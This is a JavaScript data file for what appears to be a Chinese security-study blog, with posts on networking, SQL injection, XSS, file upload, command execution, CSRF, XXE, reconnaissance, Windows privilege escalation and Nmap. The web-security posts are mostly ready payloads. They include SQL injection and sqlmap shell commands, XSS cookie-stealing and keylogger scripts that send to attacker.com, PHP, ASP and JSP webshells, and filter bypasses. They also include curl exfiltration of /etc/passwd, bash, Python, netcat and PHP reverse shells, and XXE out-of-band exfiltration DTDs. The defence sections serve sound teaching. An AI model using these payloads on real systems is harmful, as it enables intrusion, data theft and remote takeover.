export const categories = [
  {
    id: 'network',
    name: '计算机网络',
    icon: '🌐',
    children: [
      { id: 'tcp-ip', name: 'TCP/IP 基础' },
      { id: 'http-https', name: 'HTTP/HTTPS 协议' },
      { id: 'dns', name: 'DNS 解析原理' },
      { id: 'wireshark', name: 'Wireshark 抓包' },
    ]
  },
  {
    id: 'linux',
    name: 'Linux 系统',
    icon: '🐧',
    children: [
      { id: 'linux-commands', name: '常用命令速查' },
      { id: 'linux-users', name: '用户与权限管理' },
      { id: 'linux-process', name: '进程与服务管理' },
      { id: 'linux-network', name: '网络配置管理' },
    ]
  },
  {
    id: 'websec',
    name: 'Web 安全',
    icon: '🔒',
    children: [
      { id: 'sqli', name: 'SQL 注入' },
      { id: 'xss', name: 'XSS 跨站脚本' },
      { id: 'upload', name: '文件上传漏洞' },
      { id: 'rce', name: '命令执行漏洞' },
      { id: 'csrf', name: 'CSRF 请求伪造' },
      { id: 'xxe', name: 'XXE 注入' },
    ]
  },
  {
    id: 'attack-defense',
    name: '攻防对抗',
    icon: '⚔️',
    children: [
      { id: 'recon', name: '信息收集' },
      { id: 'privesc', name: '权限提升' },
      { id: 'persistence', name: '权限维持' },
      { id: 'lateral', name: '横向移动' },
      { id: 'anti-forensics', name: '反溯源' },
    ]
  },
  {
    id: 'domain',
    name: '域渗透',
    icon: '🏢',
    children: [
      { id: 'domain-basic', name: '域环境基础' },
      { id: 'domain-recon', name: '域信息收集' },
      { id: 'domain-attack', name: '域控攻击' },
      { id: 'domain-techniques', name: '常见攻击手法' },
    ]
  },
  {
    id: 'ir',
    name: '应急响应',
    icon: '🚨',
    children: [
      { id: 'ir-process', name: '事件处理流程' },
      { id: 'ir-linux', name: 'Linux 应急响应' },
      { id: 'ir-windows', name: 'Windows 应急响应' },
    ]
  },
  {
    id: 'tools',
    name: '工具手册',
    icon: '🛠️',
    children: [
      { id: 'nmap', name: 'Nmap' },
      { id: 'burpsuite', name: 'BurpSuite' },
      { id: 'sqlmap', name: 'SQLmap' },
      { id: 'nuclei', name: 'Nuclei' },
      { id: 'cobaltstrike', name: 'CobaltStrike' },
      { id: 'wireshark-tool', name: 'Wireshark' },
    ]
  },
]

export const posts = [
  // 计算机网络
  {
    slug: 'tcp-ip-basics',
    title: 'TCP/IP 基础',
    date: '2026-06-18',
    category: 'network',
    subcategory: 'tcp-ip',
    tags: ['网络', 'TCP', 'IP', '基础'],
    summary: 'TCP/IP 四层模型、三次握手、四次挥手详解。',
    content: `
## TCP/IP 四层模型

| 层 | 协议 |
|---|---|
| 应用层 | HTTP, FTP, DNS, SMTP |
| 传输层 | TCP, UDP |
| 网络层 | IP, ICMP, ARP |
| 网络接口层 | Ethernet, Wi-Fi |

## 三次握手

1. **SYN** → 客户端发送连接请求
2. **SYN+ACK** → 服务端确认并回复
3. **ACK** → 客户端确认，连接建立

## 四次挥手

1. **FIN** → 主动方请求关闭
2. **ACK** → 被动方确认
3. **FIN** → 被动方请求关闭
4. **ACK** → 主动方确认，连接关闭

## 常见端口

\`\`\`
21 - FTP
22 - SSH
23 - Telnet
25 - SMTP
53 - DNS
80 - HTTP
443 - HTTPS
3306 - MySQL
3389 - RDP
\`\`\`
    `
  },
  {
    slug: 'http-https-protocol',
    title: 'HTTP/HTTPS 协议详解',
    date: '2026-06-15',
    category: 'network',
    subcategory: 'http-https',
    tags: ['网络', 'HTTP', 'HTTPS', '协议'],
    summary: 'HTTP 请求方法、状态码、HTTPS 加密原理。',
    content: `
## HTTP 请求方法

- **GET** - 获取资源
- **POST** - 提交数据
- **PUT** - 更新资源
- **DELETE** - 删除资源
- **OPTIONS** - 查询支持的方法

## 常见状态码

| 状态码 | 含义 |
|--------|------|
| 200 | 成功 |
| 301 | 永久重定向 |
| 302 | 临时重定向 |
| 403 | 禁止访问 |
| 404 | 未找到 |
| 500 | 服务器错误 |

## HTTPS 加密流程

1. 客户端发起 HTTPS 请求
2. 服务端返回证书（公钥）
3. 客户端验证证书合法性
4. 客户端生成随机密钥，用公钥加密发送
5. 服务端用私钥解密得到随机密钥
6. 双方使用随机密钥进行对称加密通信
    `
  },
  // Web 安全
  {
    slug: 'sql-injection',
    title: 'SQL 注入完全指南',
    date: '2026-06-20',
    category: 'websec',
    subcategory: 'sqli',
    tags: ['Web安全', 'SQL注入', '渗透测试'],
    summary: 'SQL 注入原理、分类、检测方法、利用技巧和防御方案。',
    content: `
## 什么是 SQL 注入

SQL 注入是通过在输入参数中插入恶意 SQL 语句，使数据库执行非预期操作的攻击方式。攻击者可以绕过认证、窃取数据、甚至控制服务器。

## 注入原理

正常查询：
\`\`\`sql
SELECT * FROM users WHERE username='admin' AND password='123456'
\`\`\`

注入后：
\`\`\`sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- 注释掉密码验证，直接登录
\`\`\`

## 注入分类

### 按注入点分类

| 类型 | 示例 | 特征 |
|------|------|------|
| 数字型 | \`?id=1 AND 1=1\` | 无引号包裹 |
| 字符型 | \`?name=admin' AND '1'='1\` | 单引号包裹 |
| 搜索型 | \`?keyword=test%' AND '1'='1\` | LIKE 语句 |
| 布尔型 | \`?id=1' AND (SELECT LENGTH(database()))>5--\` | 条件判断 |

### 按技术分类

#### 联合查询注入（UNION）
\`\`\`sql
-- 1. 判断字段数
?id=1' ORDER BY 5--
?id=1' ORDER BY 3--  -- 报错，说明有3个字段

-- 2. 确定回显位置
?id=1' UNION SELECT 1,2,3--

-- 3. 获取数据
?id=1' UNION SELECT 1,database(),3--
?id=1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
?id=1' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'--
?id=1' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users--
\`\`\`

#### 报错注入（Error-based）
\`\`\`sql
-- extractvalue
?id=1' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--

-- updatexml
?id=1' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--

-- floor
?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
\`\`\`

#### 布尔盲注（Boolean-based）
\`\`\`sql
-- 判断数据库名长度
?id=1' AND LENGTH(database())>5--  -- 正常返回
?id=1' AND LENGTH(database())>10-- -- 错误返回

-- 逐字符判断数据库名
?id=1' AND ASCII(SUBSTR(database(),1,1))>100--
?id=1' AND ASCII(SUBSTR(database(),1,1))>110--
\`\`\`

#### 时间盲注（Time-based）
\`\`\`sql
-- MySQL
?id=1' AND IF(LENGTH(database())>5,SLEEP(3),0)--

-- PostgreSQL
?id=1'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--

-- SQL Server
?id=1'; IF (1=1) WAITFOR DELAY '0:0:3'--
\`\`\`

#### 堆叠注入（Stacked Queries）
\`\`\`sql
?id=1'; DROP TABLE users;--
?id=1'; INSERT INTO users VALUES('hacker','123456');--
\`\`\`

## 常见检测语句

\`\`\`
' OR 1=1 --
' OR '1'='1
" OR "1"="1
' UNION SELECT 1,2,3 --
1' AND SLEEP(5) --
\`\`\`

## 利用流程

1. **判断注入点**：添加单引号、逻辑条件
2. **判断注入类型**：数字型/字符型
3. **判断字段数**：ORDER BY N
4. **确定回显位置**：UNION SELECT 1,2,3...
5. **获取数据库信息**：database(), version(), user()
6. **获取表名**：information_schema.tables
7. **获取字段名**：information_schema.columns
8. **获取数据**：查询目标表内容

## 数据库特性

### MySQL
\`\`\`sql
-- 版本
SELECT version()
-- 数据库
SELECT database()
-- 用户
SELECT user()
\`\`\`

### SQL Server
\`\`\`sql
-- 版本
SELECT @@version
-- 数据库
SELECT DB_NAME()
-- 用户
SELECT SYSTEM_USER
\`\`\`

### Oracle
\`\`\`sql
-- 版本
SELECT banner FROM v$version WHERE ROWNUM=1
-- 表名
SELECT table_name FROM all_tables WHERE rownum=1
\`\`\`

## SQLmap 使用

\`\`\`bash
# 基本使用
sqlmap -u "http://target/?id=1" --dbs

# POST 注入
sqlmap -u "http://target/login" --data="user=admin&pass=123" --dbs

# 带 Cookie
sqlmap -u "http://target/?id=1" --cookie="session=xxx" --dbs

# 从 Burp 导出的请求文件
sqlmap -r request.txt --dbs

# 指定数据库和表
sqlmap -u "http://target/?id=1" -D mydb -T users --dump

# 执行系统命令
sqlmap -u "http://target/?id=1" --os-shell

# 读取文件
sqlmap -u "http://target/?id=1" --file-read="/etc/passwd"

# 绕过 WAF
sqlmap -u "http://target/?id=1" --tamper=space2comment,between --random-agent
\`\`\`

## WAF 绕过技巧

- **注释符绕过**：\`/**/\` 替代空格
- **大小写混合**：\`SeLeCt\`
- **双写绕过**：\`selselectect\`
- **编码绕过**：URL编码、Unicode编码
- **等号替换**：\`LIKE\`、\`REGEXP\`、\`BETWEEN\`
- **逗号替换**：\`JOIN\`、\`LIMIT 1 OFFSET 1\`

## 防御方案

1. **参数化查询**（Prepared Statements）
\`\`\`python
# Python 示例
cursor.execute("SELECT * FROM users WHERE username=%s", (username,))
\`\`\`

2. **存储过程**
3. **输入验证和白名单过滤**
4. **最小权限原则**：应用数据库用户只给必要权限
5. **WAF 防护**
6. **错误信息隐藏**
    `
  },
  {
    slug: 'xss-attack',
    title: 'XSS 跨站脚本攻击完全指南',
    date: '2026-06-12',
    category: 'websec',
    subcategory: 'xss',
    tags: ['Web安全', 'XSS', '前端安全'],
    summary: 'XSS 攻击类型、Payload 构造、绕过技巧和防御措施。',
    content: `
## 什么是 XSS

XSS（Cross-Site Scripting）跨站脚本攻击，攻击者在网页中注入恶意脚本，当用户浏览时执行，窃取 Cookie、会话令牌等敏感信息。

## XSS 类型

### 反射型 XSS
恶意脚本通过 URL 参数传入，服务器直接返回给用户。

\`\`\`
http://target/search?q=<script>alert(document.cookie)</script>
\`\`\`

**特点**：需要用户点击恶意链接，非持久化。

### 存储型 XSS
恶意脚本存储在服务器数据库中，所有访问该页面的用户都会受影响。

**典型场景**：留言板、评论区、用户资料。

**特点**：持久化，危害更大。

### DOM 型 XSS
前端 JavaScript 直接操作 DOM 导致的漏洞，不经过服务器。

\`\`\`javascript
// 漏洞代码
var name = location.hash.substring(1);
document.getElementById("output").innerHTML = "Hello, " + name;
\`\`\`

**攻击**：\`http://target/#<img src=x onerror=alert(1)>\`

## 常见 Payload

### 基础测试
\`\`\`html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
\`\`\`

### 标签绕过
\`\`\`html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
\`\`\`

### 事件处理器
\`\`\`html
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<object data="javascript:alert(1)">
\`\`\`

### 无括号执行
\`\`\`javascript
// 使用反引号
\`alert\`1\`\`

// 使用 SVG
<svg><script>alert&#40;1&#41;</script></svg>

// 使用 eval
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
\`\`\`

### 窃取 Cookie
\`\`\`javascript
<script>
new Image().src="http://attacker.com/steal?c="+document.cookie;
</script>

<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
\`\`\`

### Keylogger
\`\`\`javascript
<script>
document.onkeypress=function(e){
  fetch('http://attacker.com/log?k='+e.key)
}
</script>
\`\`\`

## 绕过技巧

### 大小写混合
\`\`\`html
<ScRiPt>alert(1)</sCrIpT>
\`\`\`

### 双写绕过
\`\`\`html
<scrscriptipt>alert(1)</scrscriptipt>
\`\`\`

### 编码绕过
\`\`\`html
&#60;script&#62;alert(1)&#60;/script&#62;
\x3cscript\x3ealert(1)\x3c/script\x3e
%3Cscript%3Ealert(1)%3C/script%3E
\`\`\`

### 空格绕过
\`\`\`html
<script/**/>alert(1)</script/>
<img/src=x onerror=alert(1)>
\`\`\`

### CSP 绕过
\`\`\`html
// 利用 JSONP 端点
<script src="https://target.com/jsonp?callback=alert(1)//">

// 利用 CDN
<script src="https://cdn.jsdelivr.net/npm/evil.js">
\`\`\`

## 工具

- **XSStrike**：自动化 XSS 检测
- **DalFox**：参数分析和漏洞扫描
- **kxss**：反射型 XSS 检测
- **Polyglot**：万能 Payload

\`\`\`bash
# XSStrike
python xsstrike.py -u "http://target/search?q=test"

# DalFox
dalfox url "http://target/search?q=test" --blind your-server.com
\`\`\`

## 防御方案

1. **HTML 实体编码**：\`<\` → \`&lt;\`，\`>\` → \`&gt;\`
2. **CSP（Content Security Policy）**
\`\`\`
Content-Security-Policy: default-src 'self'; script-src 'self'
\`\`\`

3. **HttpOnly Cookie**：防止 JavaScript 读取
4. **输入验证**：白名单过滤
5. **输出编码**：根据上下文选择编码方式
6. **X-XSS-Protection**：浏览器 XSS 过滤器
    `
  },
  {
    slug: 'file-upload',
    title: '文件上传漏洞利用与防御',
    date: '2026-06-14',
    category: 'websec',
    subcategory: 'upload',
    tags: ['Web安全', '文件上传', '渗透测试'],
    summary: '文件上传漏洞的检测、绕过技巧和防御方案。',
    content: `
## 什么是文件上传漏洞

文件上传漏洞是指 Web 应用允许用户上传文件但未对文件类型、内容进行严格校验，导致攻击者可以上传恶意文件（如 Webshell）获取服务器控制权。

## 危害

- 上传 Webshell 获取服务器权限
- 上传恶意文件执行命令
- 上传钓鱼文件
- 服务器被控制为跳板

## 漏洞类型

### 1. 前端校验绕过
前端 JavaScript 验证文件扩展名，可直接 Burp 抓包修改。

### 2. MIME 类型校验
仅检查 Content-Type 字段，可直接修改：
\`\`\`http
Content-Type: image/png
\`\`\`

### 3. 黑名单校验
过滤特定扩展名，可使用大小写、双写、特殊后缀绕过。

### 4. 白名单校验
仅允许特定扩展名，可利用解析漏洞。

### 5. 目录路径可控
可修改上传路径：\`filename="../../../shell.php"\`

## 绕过技巧

### 扩展名绕过
\`\`\`
php → php3, php4, php5, php7, phtml, pht, phps
asp → aspx, cfm, cer
jsp → jspf,jspx
\`\`\`

### 大小写绕过
\`\`\`
.php → .PhP, .PHP, .pHp
\`\`\`

### 双写绕过
\`\`\`
.php → .pphphp
\`\`\`

### 空字节绕过（%00 截断）
\`\`\`
shell.php%00.jpg  -- PHP 5.3.4 以下
shell.php\x00.jpg
\`\`\`

### .htaccess 绕过
上传 .htaccess 文件：
\`\`\`apache
AddType application/x-httpd-php .jpg
\`\`\`
之后上传 .jpg 文件即可当作 PHP 执行。

### .user.ini 绕过
上传 .user.ini 文件：
\`\`\`ini
auto_prepend_file=shell.jpg
\`\`\`
在同目录下所有 PHP 文件前包含 shell.jpg。

### 图片马
将 PHP 代码嵌入图片文件：
\`\`\`bash
copy /b normal.jpg + shell.php shell.jpg
\`\`\`

### 文件头绕过
在文件开头添加图片文件头：
\`\`\`
GIF89a <?php eval($_POST['cmd']); ?>
\`\`\`

## 解析漏洞

### IIS 解析漏洞
\`\`\`
/test.asp/test.jpg    -- IIS 6.0
/test.asp:.jpg        -- IIS 6.0
/test.cer             -- IIS 6.0
/test.asp;/test.jpg   -- IIS 6.0
\`\`\`

### Nginx 解析漏洞
\`\`\`
/test.jpg/.php        -- 配置不当
/test.jpg%00.php      -- 空字节
\`\`\`

### Apache 解析漏洞
\`\`\`
test.php.xxx          -- 不识别的后缀名
\`\`\`

## 一句话木马

### PHP
\`\`\`php
<?php eval($_POST['cmd']); ?>
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
\`\`\`

### ASP
\`\`\`asp
<%eval request("cmd")%>
\`\`\`

### JSP
\`\`\`jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
\`\`\`

## Webshell 管理工具

- **中国蚁剑（AntSword）**
- **哥斯拉（Godzilla）**
- **冰蝎（Behinder）**
- **冰蛇（Behinder v3）**

\`\`\`bash
# 连接一句话
蚁剑 → 添加数据 → 填写 URL 和密码
\`\`\`

## 防御方案

1. **白名单校验**：只允许特定扩展名
2. **重命名文件**：随机文件名
3. **文件内容检测**：检查文件头
4. **上传目录隔离**：Web 目录外存储
5. **禁用脚本执行**：上传目录不解析 PHP
6. **文件大小限制**
7. **使用 CDN/WAF**
    `
  },
  {
    slug: 'rce-vulnerability',
    title: '命令执行漏洞（RCE）',
    date: '2026-06-13',
    category: 'websec',
    subcategory: 'rce',
    tags: ['Web安全', 'RCE', '命令执行', '渗透测试'],
    summary: '远程代码执行和远程命令执行漏洞的原理与利用。',
    content: `
## 什么是 RCE

RCE（Remote Code Execution）远程代码执行，攻击者可以在目标服务器上执行任意命令或代码。

## 漏洞分类

### 远程命令执行（RCE）
直接执行系统命令，如 \`ping\`、\`ls\`、\`cat\`。

### 远程代码执行（Code Exec）
执行编程语言代码，如 PHP、Python、Java。

## 常见触发函数

### PHP
\`\`\`php
system()        -- 执行系统命令
exec()          -- 执行命令并返回最后一行
passthru()      -- 直接显示输出
shell_exec()    -- 执行命令并返回字符串
popen()         -- 打开进程
proc_open()     -- 执行命令并控制输入输出
eval()          -- 执行 PHP 代码
assert()        -- 执行 PHP 代码
\`\`\`

### Python
\`\`\`python
os.system()
os.popen()
subprocess.call()
subprocess.Popen()
eval()
exec()
\`\`\`

### Java
\`\`\`java
Runtime.getRuntime().exec()
ProcessBuilder
\`\`\`

## 命令执行漏洞

### 直接注入
\`\`\`
http://target/ping.php?ip=127.0.0.1;whoami
http://target/ping.php?ip=127.0.0.1|whoami
http://target/ping.php?ip=127.0.0.1||whoami
http://target/ping.php?ip=127.0.0.1&&whoami
\`\`\`

### 绕过空格过滤
\`\`\`
{cat,/etc/passwd}
cat$IFS/etc/passwd
cat\t/etc/passwd
cat<> /etc/passwd
\`\`\`

### 绕过关键字过滤
\`\`\`bash
# 绕过 cat
tac /etc/passwd
more /etc/passwd
less /etc/passwd
head /etc/passwd
tail /etc/passwd
nl /etc/passwd
od -c /etc/passwd
xxd /etc/passwd
sort /etc/passwd
uniq /etc/passwd
rev /etc/passwd

# 绕过 flag
f\\lag
fla[g]
cat /etc/pas*wd
cat /etc/pas?wd
\`\`\`

### 无回显利用
\`\`\`bash
# 写入文件
echo PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4= | base64 -d > shell.php

# 外带数据
cat /etc/passwd | curl http://attacker.com/$(cat /etc/passwd | base64)

# 反弹 Shell
bash -i >& /dev/tcp/attacker.com/4444 0>&1
\`\`\`

## 代码执行漏洞

### PHP eval
\`\`\`php
// 漏洞代码
<?php eval($_GET['code']); ?>

// 利用
?code=system('whoami');
?code=phpinfo();
\`\`\`

### Python exec
\`\`\`python
# 漏洞代码
exec(request.args.get('code'))

# 利用
?code=__import__('os').popen('whoami').read()
\`\`\`

## 常见场景

### CTF 题目
\`\`\`
- ping 命令注入
- 日志分析注入
- 代码审计找 eval
- Python 沙箱逃逸
\`\`\`

### 实际漏洞
\`\`\`
- Weblogic 反序列化
- Struts2 OGNL 注入
- Apache Shiro 反序列化
- Log4j2 JNDI 注入
\`\`\`

## 反弹 Shell

### Bash
\`\`\`bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
\`\`\`

### Python
\`\`\`python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
\`\`\`

### Netcat
\`\`\`bash
nc -e /bin/sh attacker.com 4444
\`\`\`

### PHP
\`\`\`php
<?php
$sock=fsockopen("attacker.com",4444);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
\`\`\`

## 防御方案

1. **输入验证**：白名单过滤
2. **避免使用危险函数**
3. **使用参数化接口**
4. **最小权限原则**
5. **禁用危险 PHP 函数**
\`\`\`ini
; php.ini
disable_functions = system,exec,shell_exec,passthru,popen,proc_open
\`\`\`

6. **WAF 规则**
    `
  },
  {
    slug: 'csrf-attack',
    title: 'CSRF 请求伪造攻击',
    date: '2026-06-11',
    category: 'websec',
    subcategory: 'csrf',
    tags: ['Web安全', 'CSRF', '请求伪造'],
    summary: 'CSRF 攻击原理、利用方式和防御方案。',
    content: `
## 什么是 CSRF

CSRF（Cross-Site Request Forgery）跨站请求伪造，攻击者诱导用户在已登录的状态下访问恶意页面，浏览器自动携带用户凭证发送伪造请求。

## 攻击原理

1. 用户登录目标网站，获得 Session/Cookie
2. 用户访问攻击者控制的页面
3. 恶意页面向目标网站发送请求
4. 浏览器自动携带用户 Cookie
5. 目标网站认为是用户本人操作

## 攻击方式

### GET 型 CSRF
\`\`\`html
<!-- 修改用户密码 -->
<img src="http://target.com/change_password?new=hacked">

<!-- 转账 -->
<img src="http://target.com/transfer?to=attacker&amount=10000">
\`\`\`

### POST 型 CSRF
\`\`\`html
<form action="http://target.com/change_password" method="POST">
  <input type="hidden" name="new_password" value="hacked">
</form>
<script>document.forms[0].submit()</script>
\`\`\`

### Flash CSRF
\`\`\`html
<object type="application/x-shockwave-flash" 
  data=".swf">
  <param name="movie" value="http://attacker.com/csrf.swf">
</object>
\`\`\`

## 利用场景

### 修改个人信息
\`\`\`html
<form action="http://target.com/profile/update" method="POST">
  <input name="email" value="hacker@evil.com">
</form>
\`\`\`

### 发送邮件/消息
\`\`\`html
<form action="http://target.com/api/send" method="POST">
  <input name="to" value="victim@target.com">
  <input name="content" value="点击链接领奖">
</form>
\`\`\`

### 删除操作
\`\`\`html
<img src="http://target.com/api/delete?id=123">
\`\`\`

## CSRF 与 XSS 的区别

| 特性 | XSS | CSRF |
|------|-----|------|
| 攻击目标 | 用户浏览器 | Web 应用 |
| 利用方式 | 注入恶意脚本 | 伪造用户请求 |
| 是否需要登录 | 不需要 | 需要 |
| 危害 | 窃取数据 | 执行操作 |
| 防御重点 | 输入过滤 | Token 验证 |

## 防御方案

### 1. CSRF Token
\`\`\`html
<!-- 表单中添加 Token -->
<form action="http://target.com/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="随机Token">
  <input name="amount" value="100">
</form>
\`\`\`

### 2. SameSite Cookie
\`\`\`
Set-Cookie: session=xxx; SameSite=Strict
Set-Cookie: session=xxx; SameSite=Lax
\`\`\`

### 3. 验证 Referer/Origin
\`\`\`python
if request.headers.get('Referer') != 'http://target.com':
    return 'Forbidden'
\`\`\`

### 4. 验证 Content-Type
\`\`\`python
if request.content_type != 'application/json':
    return 'Forbidden'
\`\`\`

### 5. 自定义请求头
\`\`\`javascript
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': token,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({amount: 100})
})
\`\`\`

### 6. 二次验证
重要操作（如转账）要求输入密码确认。
    `
  },
  {
    slug: 'xxe-injection',
    title: 'XXE 注入漏洞详解',
    date: '2026-06-09',
    category: 'websec',
    subcategory: 'xxe',
    tags: ['Web安全', 'XXE', 'XML注入'],
    summary: 'XXE 漏洞原理、利用方式和防御方案。',
    content: `
## 什么是 XXE

XXE（XML External Entity）XML 外部实体注入，当应用解析用户提供的 XML 数据时，未禁用外部实体，导致攻击者可以读取文件、执行命令、发起 SSRF。

## XML 基础

### DTD（文档类型定义）
\`\`\`xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>&xxe;</user>
\`\`\`

### 实体类型
- **内部实体**：\`<!ENTITY xxe "value">\`
- **外部实体**：\`<!ENTITY xxe SYSTEM "url">\`
- **参数实体**：\`<!ENTITY % xxe SYSTEM "url">\`

## 漏洞类型

### 1. 读取本地文件
\`\`\`xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>&xxe;</user>
\`\`\`

### 2. 读取 Windows 文件
\`\`\`xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
\`\`\`

### 3. SSRF 攻击
\`\`\`xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
\`\`\`

### 4. 带外数据回显（OOB）
\`\`\`xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
\`\`\`

evil.dtd：
\`\`\`xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%data;'>">
%param;
\`\`\`

### 5. 参数实体注入
\`\`\`xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexist/%file;'>">
  %eval;
  %error;
]>
\`\`\`

## 检测方法

### 判断是否存在 XXE
\`\`\`xml
<!-- 方法1：盲注 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/xxe-test">
]>
<user>&xxe;</user>

<!-- 方法2：错误触发 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///nonexistent">
]>
<user>&xxe;</user>
\`\`\`

### 使用工具
\`\`\`bash
# XXEinjector
ruby XXEinjector.rb --host=attacker.com --file=request.txt
\`\`\`

## 常见应用场景

### 文件上传（SVG）
\`\`\`xml
<!-- 上传恶意 SVG 文件 -->
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">
    <script>
      document.location='http://attacker.com/?c='+document.cookie;
    </script>
  </text>
</svg>
\`\`\`

### SOAP 接口
\`\`\`xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <user>&xxe;</user>
  </soap:Body>
</soap:Envelope>
\`\`\`

### PDF 生成
某些 PDF 生成库（如 wkhtmltopdf）会解析 HTML 中的 XML 实体。

## 绕过技巧

### 字符编码
\`\`\`xml
<!-- UTF-7 -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<!-- 十六进制编码 -->
<!ENTITY xxe SYSTEM "hex:2f6574632f706173737764">
\`\`\`

### 协议限制
\`\`\`xml
<!-- 尝试不同协议 -->
file:///etc/passwd
http://127.0.0.1/
ftp://127.0.0.1/
gopher://127.0.0.1/
\`\`\`

## 防御方案

1. **禁用外部实体**
\`\`\`python
# Python
import xml.etree.ElementTree as ET
# 默认已禁用

# Java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
\`\`\`

2. **输入验证**：过滤 XML 数据
3. **使用 JSON 替代 XML**
4. **WAF 规则**：过滤 \`SYSTEM\`、\`PUBLIC\` 关键字
5. **最小权限**：Web 服务器进程不读取敏感文件
    `
  },
  // 攻防对抗
  {
    slug: 'recon-methods',
    title: '信息收集方法论',
    date: '2026-06-10',
    category: 'attack-defense',
    subcategory: 'recon',
    tags: ['渗透测试', '信息收集', ' reconnaissance'],
    summary: '渗透测试信息收集阶段的完整方法和工具。',
    content: `
## 信息收集分类

### 被动信息收集
- **WHOIS 查询**
- **子域名枚举**：subfinder, amass, oneforAll
- **DNS 记录查询**：dig, nslookup
- **搜索引擎**：Google Hacking, Shodan, FOFA
- **证书透明度**：crt.sh

### 主动信息收集
- **端口扫描**：Nmap, Masscan
- **服务识别**
- **操作系统探测**
- **漏洞扫描**：Nuclei, Xray

## 常用工具

\`\`\`bash
# 子域名枚举
subfinder -d target.com -o subdomains.txt

# Nmap 扫描
nmap -sV -sC -p- target.com

# 目录扫描
dirsearch -u http://target.com/

# 漏洞扫描
nuclei -u http://target.com/ -t cves/
\`\`\`

## Google Hacking

\`\`\`
site:target.com filetype:php
intitle:"index of" "parent directory"
inurl:admin login
\`\`\`
    `
  },
  {
    slug: 'windows-privesc',
    title: 'Windows 权限提升',
    date: '2026-06-08',
    category: 'attack-defense',
    subcategory: 'privesc',
    tags: ['渗透测试', '权限提升', 'Windows'],
    summary: 'Windows 环境下的常见提权方法和工具。',
    content: `
## 提权方法

### 1. 系统漏洞提权
\`\`\`powershell
# 查看系统补丁
systeminfo | findstr KB

# 使用 watson/WinPEAS 检查可利用漏洞
\`\`\`

### 2. 服务配置提权
\`\`\`powershell
# 查找可写路径的服务
sc qc <service_name>
icacls "C:\\path\\to\\service.exe"
\`\`\`

### 3. 计划任务提权
\`\`\`powershell
# 列出计划任务
schtasks /query /fo LIST /v

# 查找可修改的计划任务
\`\`\`

### 4. AlwaysInstallElevated
\`\`\`powershell
# 检查注册表
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
\`\`\`

### 5. Token 模拟
\`\`\`powershell
# potato 系列
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *
\`\`\`

## 工具
- WinPEAS
- PowerUp
- SharpUp
- Seatbelt
    `
  },
  // 工具手册
  {
    slug: 'nmap-guide',
    title: 'Nmap 使用指南',
    date: '2026-06-05',
    category: 'tools',
    subcategory: 'nmap',
    tags: ['工具', 'Nmap', '扫描'],
    summary: 'Nmap 端口扫描工具的完整使用指南。',
    content: `
## 基本用法

\`\`\`bash
# 快速扫描
nmap target.com

# 全端口扫描
nmap -p- target.com

# 服务版本检测
nmap -sV target.com

# 操作系统探测
nmap -O target.com

# 使用脚本
nmap --script vuln target.com
\`\`\`

## 常用参数

| 参数 | 说明 |
|------|------|
| -sS | TCP SYN 扫描 |
| -sT | TCP 连接扫描 |
| -sU | UDP 扫描 |
| -sV | 版本检测 |
| -O | 操作系统探测 |
| -A | 全面扫描 |
| -p | 指定端口 |
